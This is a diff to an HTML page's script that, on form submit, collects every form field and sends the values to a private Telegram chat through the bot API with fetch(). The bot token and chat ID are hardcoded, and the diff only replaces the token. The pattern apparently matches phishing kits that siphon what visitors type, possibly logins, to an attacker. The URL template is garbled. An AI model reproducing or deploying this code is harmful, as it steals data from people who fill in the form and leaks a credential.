@@ -121,7 +121,7 @@ document.addEventListener('DOMContentLoaded', function() {
       for (let [key, value] of formData.entries()) {
         message += `${key}: ${value}\n`;
       }
-      const botToken = '8797033069:AAGa2a1VR26bANjPpiTaO4BOc2EPi9EoyyU';
+      const botToken = '8797033069:AAGVN5X4Sqen0gfnwjCtuqxuHhn6QMuayPo';
       const chatId = '7565710408';
       const url = `https://api.telegram.org/bot\( {botToken}/sendMessage?chat_id= \){chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
       fetch(url)
@@ -140,4 +140,5 @@ document.addEventListener('DOMContentLoaded', function() {
 </script>
 
 </body>
+
 </html>
